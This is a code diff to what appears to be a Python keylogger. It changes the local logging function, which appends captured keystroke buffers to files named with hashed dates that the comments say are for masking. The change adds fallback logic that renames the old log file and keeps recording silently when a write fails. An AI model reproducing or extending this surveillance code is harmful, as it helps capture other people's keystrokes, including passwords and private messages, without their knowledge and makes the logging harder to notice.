@@ -251,15 +251,25 @@ def encrypt(message_str):
 
 def log_local():
     # Local mode
-    global full_path, line_buffer, backspace_buffer_len
+    global full_path, line_buffer, backspace_buffer_len, window_name, time_logged
     todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
     # md5 only for masking dates - it's easily crackable:
     todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
     try:
         with open(os.path.join(full_path, todays_date_hashed + ".txt"), "a") as fp:
             fp.write(line_buffer)
-    except Exception as e:
-        print(e)
+    except:
+        # maybe a problem with appending to the same file. rename the old one, and continue as normal
+        counter = 0
+        while os.path.exists(os.path.join(full_path, todays_date_hashed + "_" + str(counter) + ".txt")):
+            counter += 1
+        try:
+            os.rename(os.path.join(full_path, todays_date_hashed + ".txt"),
+                      os.path.join(full_path, todays_date_hashed + "_" + str(counter) + ".txt"))
+            window_name = ''
+            time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
+        except Exception as e:
+            print(e)
     line_buffer, backspace_buffer_len = '', 0
     return True
 
